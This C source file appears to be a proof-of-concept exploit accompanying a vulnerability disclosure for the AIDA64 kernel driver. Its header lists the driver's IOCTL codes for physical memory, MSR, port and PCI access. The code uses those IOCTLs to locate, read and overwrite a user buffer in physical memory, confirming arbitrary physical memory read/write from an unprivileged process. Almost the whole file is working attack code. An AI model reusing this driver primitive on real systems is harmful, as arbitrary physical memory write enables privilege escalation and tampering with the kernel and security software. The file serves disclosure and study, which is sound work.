/*
 * DISCLAIMER: Some of this documentation and code was ai assisted.
 *
 * aida64_rw.c - Arbitrary physical memory R/W via the AIDA64 kernel driver
 *
 * Device : \Device\AIDA64Driver   (legacy driver, created from DriverEntry;
 *                                  openable by any user, no ACL)
 * IOCTLs : 0x80112074  read  4 bytes at physical (hi<<32)|lo    -> value @ +4
 *          0x80112078  write 4 bytes value to physical (hi<<32)|lo
 *          0x80112040  memcpy(dest_va, MmMapIoSpace(phys, size), size)
 *          0x8011204c / 0x80112084  rdmsr / wrmsr
 *          (plus port I/O and PCI config space R/W)
 *
 * Robust self-verifying proof:
 *   1. Fill a large user buffer with a unique marker.
 *   2. Locate a physical page of that buffer by scanning physical memory
 *      with the driver's bulk-copy IOCTL.
 *   3. Read it back through the driver.
 *   4. Overwrite it through the driver and confirm the user-space mapping
 *      changed.
 *
 * Note: large MmMapIoSpace requests fail for some physical ranges, so the
 * buffer is filled entirely but scanned/copied in small chunks.
 *
 * Disclosure reported to MITRE
 */

#include <windows.h>
#include <stdio.h>
#include <stdint.h>

// IOCTL codes
#define IOCTL_PHYS_READ4   0x80112074u
#define IOCTL_PHYS_WRITE4  0x80112078u
#define IOCTL_PHYS_READBUF 0x80112040u

// Scan params
#define BUF_SZ (16u * 1024u * 1024u) /* marker buffer size            */
#define CHUNK  0x10000u              /* 64 KB - safe on low-RAM boxes */

static HANDLE g_dev = INVALID_HANDLE_VALUE;

// Driver IOCTL wrappers

static BOOL phys_read4(uint64_t pa, uint32_t *out)
{
    uint8_t buf[0x10] = { 0 };
    DWORD ret = 0;

    *(uint32_t *)(buf + 4)  = 0;
    *(uint32_t *)(buf + 8)  = (uint32_t)(pa & 0xffffffffu);
    *(uint32_t *)(buf + 12) = (uint32_t)(pa >> 32);

    if (!DeviceIoControl(g_dev, IOCTL_PHYS_READ4, buf, sizeof(buf),
                          buf, sizeof(buf), &ret, NULL))
        return FALSE;

    *out = *(uint32_t *)(buf + 4);
    return TRUE;
}

static BOOL phys_write4(uint64_t pa, uint32_t val)
{
    uint8_t buf[0x10] = { 0 };
    DWORD ret = 0;

    *(uint32_t *)(buf + 4)  = val;
    *(uint32_t *)(buf + 8)  = (uint32_t)(pa & 0xffffffffu);
    *(uint32_t *)(buf + 12) = (uint32_t)(pa >> 32);

    return DeviceIoControl(g_dev, IOCTL_PHYS_WRITE4, buf, sizeof(buf),
                            buf, sizeof(buf), &ret, NULL);
}

static BOOL phys_readbuf(uint64_t pa, uint32_t size, void *dst)
{
    uint8_t buf[0x20] = { 0 };
    DWORD ret = 0;

    *(uint32_t *)(buf + 0x00) = size;
    *(uint32_t *)(buf + 0x04) = (uint32_t)(pa & 0xffffffffu);
    *(uint32_t *)(buf + 0x08) = (uint32_t)(pa >> 32);
    *(uint64_t *)(buf + 0x10) = (uint64_t)(uintptr_t)dst;

    return DeviceIoControl(g_dev, IOCTL_PHYS_READBUF, buf, sizeof(buf),
                            buf, sizeof(buf), &ret, NULL);
}

// Just a marker
static const uint8_t MAGIC[16] = {
    0xD6, 0x1A, 0x4A, 0xF0, 0x9C, 0x3B, 0x77, 0x21,
    0xAE, 0x5F, 0x13, 0x88, 0x42, 0xC7, 0x0D, 0x99
};

int main(void)
{
    uint64_t m0, m1;
    MEMORYSTATUSEX ms;
    uint8_t *data, *dump;
    uint64_t total, maxpa, found_pa = 0;
    uint32_t v0;
    SIZE_T k;

    memcpy(&m0, MAGIC, 8);
    memcpy(&m1, MAGIC + 8, 8);

    // Opening the driver
    g_dev = CreateFileA("\\\\.\\AIDA64Driver",
                         GENERIC_READ | GENERIC_WRITE,
                         FILE_SHARE_READ | FILE_SHARE_WRITE,
                         NULL, OPEN_EXISTING, 0, NULL);
    if (g_dev == INVALID_HANDLE_VALUE)
        g_dev = CreateFileA("\\\\?\\GLOBALROOT\\Device\\AIDA64Driver",
                             GENERIC_READ | GENERIC_WRITE,
                             FILE_SHARE_READ | FILE_SHARE_WRITE,
                             NULL, OPEN_EXISTING, 0, NULL);
    if (g_dev == INVALID_HANDLE_VALUE) {
        printf("open \\\\.\\AIDA64Driver failed, GetLastError=%lu\n", GetLastError());
        return 1;
    }
    printf("opened \\\\.\\AIDA64Driver\n");

    // Trivial read to confirm IOCTL
    if (phys_read4(0x1000, &v0))
        printf("phys read  0x0000000000001000 = 0x%08X\n", v0);
    else
        printf("!!! phys read 0x1000 failed (err=%lu)\n", GetLastError());

    // Alocate and tag a big buffer
    data = (uint8_t *)VirtualAlloc(NULL, BUF_SZ, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!data) {
        printf("!!! VirtualAlloc failed\n");
        return 1;
    }
    for (k = 0; k + 16 <= BUF_SZ; k += 16)
        memcpy(data + k, MAGIC, 16);
    VirtualLock(data, BUF_SZ);

    dump = (uint8_t *)VirtualAlloc(NULL, CHUNK, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!dump) {
        printf("[-] dump alloc failed\n");
        return 1;
    }

    // Search for the marker
    ms.dwLength = sizeof(ms);
    GlobalMemoryStatusEx(&ms);
    total = ms.ullTotalPhys;
    maxpa = total + 0x80000000ULL; /* RAM can sit above ullTotalPhys (MMIO hole) */

    printf("scanning up to %llu MB physical (RAM=%llu MB) for marker @ user VA %p\n",
           (unsigned long long)(maxpa >> 20), (unsigned long long)(total >> 20), data);

    for (uint64_t pa = 0; pa < maxpa; pa += CHUNK) {
        uint32_t sz = (uint32_t)((maxpa - pa) < CHUNK ? (maxpa - pa) : CHUNK);

        if (!phys_readbuf(pa, sz, dump))
            continue;

        for (uint32_t i = 0; i + 16 <= sz; i += 16) {
            uint64_t w0, w1;
            memcpy(&w0, dump + i, 8);
            memcpy(&w1, dump + i + 8, 8);
            if (w0 == m0 && w1 == m1) {
                found_pa = pa + i;
                break;
            }
        }
        if (found_pa)
            break;
    }
    if (!found_pa) {
        printf("!!! marker not found in physical memory\n");
        return 1;
    }
    printf("found buffer physical page at 0x%llX (user buffer %p)\n",
           (unsigned long long)found_pa, data);

    // Verify the read
    if (!phys_read4(found_pa, &v0)) {
        printf("!!! read4 failed\n");
        return 1;
    }
    printf("driver read 0x%llX = 0x%08X (expected 0x%08X) %s\n",
           (unsigned long long)found_pa, v0, (uint32_t)m0,
           v0 == (uint32_t)m0 ? "OK" : "MISMATCH");
    if (v0 != (uint32_t)m0) {
        printf("!!! read verification failed\n");
        return 1;
    }

    // Write using the driver and check user mapping
    {
        uint32_t newval = 0x41424344u, back = 0;
        BOOL uview_ok = FALSE;

        if (!phys_write4(found_pa, newval)) {
            printf("[-] write4 failed (err=%lu)\n", GetLastError());
            return 1;
        }
        FlushProcessWriteBuffers();

        // find the patched slot in our buffer
        for (k = 0; k + 4 <= BUF_SZ; k += 16) {
            uint32_t cur;
            memcpy(&cur, data + k, 4);
            if (cur == newval) {
                uview_ok = TRUE;
                break;
            }
        }

        phys_read4(found_pa, &back);
        printf("wrote 0x%08X to physical 0x%llX\n", newval, (unsigned long long)found_pa);
        printf("driver read-back      = 0x%08X %s\n", back, back == newval ? "OK" : "FAIL");
        printf("user buffer reflects  = %s\n", uview_ok ? "OK" : "FAIL");

        phys_write4(found_pa, v0); // restore the original value

        if (back == newval && uview_ok) {
            printf("\n[RESULT] ARBITRARY PHYSICAL MEMORY R/W VERIFIED\n");
            printf("         read  : 0x80112074 (any physical address)\n");
            printf("         write : 0x80112078 (any physical address)\n");
            printf("         (this driver: %s)\n", "AIDA64 kerneld");
            return 0;
        }

        printf("\n[RESULT] R/W NOT VERIFIED\n");
        return 2;
    }
}
